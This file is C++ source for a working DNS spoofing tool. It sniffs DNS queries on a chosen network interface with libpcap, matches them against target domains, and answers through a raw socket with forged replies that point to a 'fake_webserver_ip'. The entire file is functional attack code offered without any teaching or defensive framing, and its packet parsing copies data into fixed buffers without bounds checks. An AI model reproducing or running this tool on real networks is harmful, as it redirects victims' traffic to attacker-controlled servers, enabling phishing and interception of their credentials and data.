#include <stdio.h>
#include <string.h>
#include <string>
#include <sstream>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <vector>
#include <utility>

#include "protocol.hpp"

char domain[1024];
char fake_webserver_ip[16];

int packet_capture_start(void);
void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char *pkt_data);
void print_packet_data(const struct pcap_pkthdr *header, const u_char *pkt_data);
void make_domain(const struct pcap_pkthdr *header, const u_char *pkt_data, char* result);

int packet_capture_start(){
    struct bpf_program fcode;
    bpf_u_int32 mask;
    pcap_t *adhandle;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs;
    pcap_if_t *d;
    int i = 0;

    const char * filter = "port 53 and (udp and (udp[10] & 128 = 0))";     // Recv
    // const char * filter = "port 53 and (udp and (not udp[10] & 128 = 0))";  // Send

    if (pcap_findalldevs(&alldevs, errbuf) < 0) {
        printf("pcap_findalldevs error\n");
        return -1;
    }

    std::vector<char*> interface_list;

	for (d = alldevs; d; d = d->next) {
        if(d->next==NULL){
            break;
        }

        adhandle = pcap_open_live(d->name, 1000, 1, 300, errbuf);
		if (pcap_datalink(adhandle) == DLT_EN10MB && d->addresses != NULL) {
            interface_list.push_back(d->name);
		}
        pcap_close(adhandle);
	}

	for (int i = 0; i < interface_list.size(); i++) {
        printf("%d : %s\n", i+1, interface_list[i]);
	}
    
    int select_interface_number;
	printf("Enter the interface number you would like to sniff : ");
	scanf("%d", &select_interface_number);
    printf("\n"); 

    if(select_interface_number <1 || select_interface_number > interface_list.size()){
        printf("Network interface out of range\n");
        return -2;
    }

    if (!(adhandle=pcap_open_live(interface_list[select_interface_number-1], 65536, 1, 1000, errbuf))) {
		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
        pcap_freealldevs(alldevs);
        return -3;
    }

	if (pcap_compile(adhandle, &fcode, filter, 1, mask) == -1) {
		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
        return -4;
	}

	if (pcap_setfilter(adhandle, &fcode) == -1) {
		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
		return -5;
	}

    printf("┌───────────────────────────────────────────────────────────────────────────────────────────────────┐\n");
    printf("│ dns-spoofing: linstening on %d [udp dst port 53 and not src %15s]                       │\n", select_interface_number, fake_webserver_ip);
    printf("├────┬─────────────────┬───────┬─────────────────┬───────┬───────────┬────────┬───┬─────────────────┤\n");
    printf("│Info│ source ip       │ sport │ destination ip  │ dport │ Data size │   ID   │Q&A│   information   │\n");
    printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
    fflush(stdout);
    
    pcap_freealldevs(alldevs);
    pcap_loop(adhandle, 0, packet_handler, NULL);
    pcap_close(adhandle);

    return 0;
}

void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char *pkt_data) {
    ether_header *eth = (ether_header*)(pkt_data);
    ip_header *ip = (ip_header*)(pkt_data+sizeof(ether_header));
    udp_header *udp = (udp_header*)(pkt_data+sizeof(ether_header)+sizeof(ip_header));
    dns_header *dns = (dns_header*)(pkt_data + 42);
    char extract_domain[1024];
    memset(extract_domain, 0x00, 1024);
    make_domain(header, pkt_data, extract_domain);

    if(strcmp(extract_domain, "")==0){
        return;
    }

    if(strstr(domain, extract_domain)!=NULL){
        char source_ip[16];
        char dest_ip[16];
        int sport = ntohs(udp->sport);
        int dport = ntohs(udp->dport);
        int dns_id = ntohs(dns->ID);
        char display_domain[1024];
        memset(display_domain, 0x00, 1024);
        memcpy(display_domain, extract_domain, 1024);
        if(strlen(display_domain)>16){
            for(int i=13;i<16;i++){
                display_domain[i]='.';
            }
            for(int i=16;i<strlen(display_domain);i++){
                display_domain[i]='\0';
            }
        }
        
        snprintf(source_ip, sizeof(source_ip), "%d.%d.%d.%d", ip->saddr.byte1, ip->saddr.byte2, ip->saddr.byte3, ip->saddr.byte4);
        snprintf(dest_ip, sizeof(dest_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);

        for (int j = 0; j < 101 ; j++) {
            printf("\b \b");
        }

        printf("├────┼─────────────────┼───────┼─────────────────┼───────┼───────────┼────────┼───┼─────────────────┤\n");
        printf("│Recv│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ Q │ %-16s│\n", source_ip, sport, dest_ip, dport, header->caplen,dns_id, display_domain);

        unsigned char dns_response[1024];
        memset(dns_response, 0x00, 1024);
        unsigned char* dns_reply_hdr = dns_response + sizeof(ip_header) + sizeof(udp_header);

        dns_reply_hdr[0]=dns->ID & 0xff; 
        dns_reply_hdr[1]=(dns->ID >> 8) & 0xff;
        dns_reply_hdr[2]=0x81;
        dns_reply_hdr[3]=0x80;

        dns_reply_hdr[4]=dns->QDCNT & 0xff; 
        dns_reply_hdr[5]=(dns->QDCNT >> 8) & 0xff;

        dns_reply_hdr[6]=0x00;
        dns_reply_hdr[7]=0x01;

        dns_reply_hdr[8] = dns->NSCNT & 0xff;
        dns_reply_hdr[9]=(dns->NSCNT >> 8) & 0xff;

        dns_reply_hdr[10] = dns->ARCNT & 0xff;
        dns_reply_hdr[11]=(dns->ARCNT >> 8) & 0xff;
    
        int size = header->caplen-54-4;

        for(int i=0;i<size;i++){
            dns_reply_hdr[12+i]=pkt_data[i+54];
        }

        dns_reply_hdr[size+12]=0x00; 
        dns_reply_hdr[size+13]=0x01; 

        dns_reply_hdr[size+14]=0x00; 
        dns_reply_hdr[size+15]=0x01; 

        dns_reply_hdr[size+16]=0xc0;
        dns_reply_hdr[size+17]=0x0c;

        dns_reply_hdr[size+18]=0x00;
        dns_reply_hdr[size+19]=0x01;

        dns_reply_hdr[size+20]=0x00;
        dns_reply_hdr[size+21]=0x01;

        dns_reply_hdr[size+22]=0x00;
        dns_reply_hdr[size+23]=0x00;
        dns_reply_hdr[size+24]=0x00;
        dns_reply_hdr[size+25]=0x34;

        dns_reply_hdr[size+26]=0x00;
        dns_reply_hdr[size+27]=0x04;


        unsigned char ip_in_hex[4];
        sscanf(fake_webserver_ip, "%d.%d.%d.%d",(int *)&ip_in_hex[0],(int *)&ip_in_hex[1], (int *)&ip_in_hex[2], (int *)&ip_in_hex[3]); //copy arg to int array
        memcpy(&dns_reply_hdr[size+28], ip_in_hex, 4);


        int full_size = size+32;

        ip->tlen = htons(sizeof(ip_header) + sizeof(udp_header) + full_size);
        ip_address temp = ip->daddr;  
        ip->daddr = ip->saddr;
        ip->saddr = temp;

        int temp_port = udp->sport;
        udp->sport = htons(53);
        udp->dport = temp_port; 
        udp->len = htons(sizeof(udp_header) + full_size);

        udp->crc = 0;

        memcpy(&dns_response[0], (char *)ip, sizeof(ip_header));
        memcpy(&dns_response[sizeof(ip_header)], (char *)udp, sizeof(udp_header));

        full_size = full_size + (sizeof(ip_header) + sizeof(udp_header));
        struct sockaddr_in serv_addr;
        int sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(temp_port);

        char target_ip[16];
        snprintf(target_ip, sizeof(target_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);

        inet_pton(AF_INET, target_ip, &(serv_addr.sin_addr));
        int tmp = 1;

        if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
            printf("setsockopt hdrincl error\n");
        };

        int result = sendto(sfd, dns_response, full_size, 0, (struct sockaddr *)&serv_addr,
                            sizeof(serv_addr));

        if(result < 0) {
            printf("error sending udp %d\n", result);
        }
        
        printf("│Send│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ A │ %-16s│\n", dest_ip, dport, source_ip, sport, full_size,dns_id, fake_webserver_ip);
        printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
        fflush(stdout);
    }
}

void make_domain(const struct pcap_pkthdr *header, const u_char *pkt_data, char *result){
    ether_header *eth;
    ip_header *ip;
    udp_header *udp;
    dns_header *dns;

    eth = (ether_header*)(pkt_data);
    ip = (ip_header*)(pkt_data+sizeof(ether_header));
    udp = (udp_header*)(pkt_data+sizeof(ether_header)+sizeof(ip_header));
    dns = (dns_header*)(pkt_data + 42);
    const unsigned char *etc = pkt_data+42 +sizeof(dns_header);

    char dns_data[1024];
    memset(dns_data, 0x00, 1024);

    for(int i=0;i<header->caplen;i++){
        dns_data[i] = (unsigned int)pkt_data[i+54];
    }

    int size_before_dot = dns_data[0];
    int index = 0;
    int size_index = 1;

    while(size_before_dot > 0) {
        int i=0;

        while(i < size_before_dot) {
            result[index++] = dns_data[i+size_index];
            i++;
        }

        result[index++]='.';
        size_index=size_index+size_before_dot;
        size_before_dot = dns_data[size_index++];
    }

    result[--index]='\0';
}

void print_packet_data(const struct pcap_pkthdr *header, const u_char *pkt_data){
    ether_header *eth = (ether_header*)(pkt_data);
    ip_header *ip = (ip_header*)(pkt_data+sizeof(ether_header));
    udp_header *udp = (udp_header*)(pkt_data+(sizeof(ether_header)+sizeof(ip_header)-4));
    dns_header *dns_hdr =  (dns_header*)(pkt_data + 42);
    
    // Ethernet header
    printf("Ether Header\n");
    printf(" | -Destination Address : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
           eth->dst_host[0], eth->dst_host[1], eth->dst_host[2],
           eth->dst_host[3], eth->dst_host[4], eth->dst_host[5]);
    printf(" | -Source Address : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
           eth->src_host[0], eth->src_host[1], eth->src_host[2],
           eth->src_host[3], eth->src_host[4], eth->src_host[5]);
    printf(" | -Protocol : 0x%.4x\n", ntohs(eth->frame_type));
    
    // IP Header
    printf("IP Header\n");
    printf(" | -Source IPaddress : %d.%d.%d.%d\n", ip->saddr.byte1,
           ip->saddr.byte2, ip->saddr.byte3, ip->saddr.byte4);
    printf(" | -Destination IPaddress : %d.%d.%d.%d\n", ip->daddr.byte1,
           ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);

    // UDP Header
    printf( "UDP Header\n");
    printf(" | -Source Port : %d\n", ntohs(udp->sport));
    printf(" | -Destionation Port : %d\n", ntohs(udp->dport));
    printf(" | -Length : %d\n", ntohs(udp->len));
    printf(" | -Checksum : %d\n", ntohs(udp->crc));

    // DNS Header
    printf("DNS Header\n");
    printf(" | -ID : %.2x\n", ntohs(dns_hdr->ID));
    printf(" | -QR : % d\n", (unsigned int)dns_hdr->QR);
    printf(" | -OPCODE : % d\n", (unsigned int)dns_hdr->OPCODE);
    printf(" | -AA : %d\n", (unsigned int)dns_hdr->AA);
    printf(" | -TC : %d\n", (unsigned int)dns_hdr->TC);
    printf(" | -RD : %d\n", (unsigned int)dns_hdr->RD);
    printf(" | -RA : %d\n", (unsigned int)dns_hdr->RA);
    printf(" | -Z : %d\n", (unsigned int)dns_hdr->Z);
    printf(" | -AD : %d\n", (unsigned int)dns_hdr->AD);
    printf(" | -CD : %d\n", (unsigned int)dns_hdr->CD);
    printf(" | -RCODE : %d\n", (unsigned int)dns_hdr->RCODE);
    printf(" | -QDCNT : %d\n", ntohs(dns_hdr->QDCNT));
    printf(" | -ANCNT : %d\n", ntohs(dns_hdr->ANCNT));
    printf(" | -NSCNT : %d\n", ntohs(dns_hdr->NSCNT));
    printf(" | -ARCNT : %d\n", ntohs(dns_hdr->ARCNT));

    printf("=====\n");
    printf(" | -Type : %d\n", ntohs(dns_hdr->TYPE));
    printf(" | -Class : %d\n", ntohs(dns_hdr->CLASS));

    printf("\n\n");

	unsigned c;
    int i, j, Size = header->caplen;
	for (i = 0; i < Size; i++)	{
		c = pkt_data[i];
        if(i!=0&&i%8==0){
            printf("  ");
        }

        if(i!=0&&i%16==0){
            printf("\n");
        }
        printf("%.2x ", (unsigned int)c);
	}printf("\n\n");
}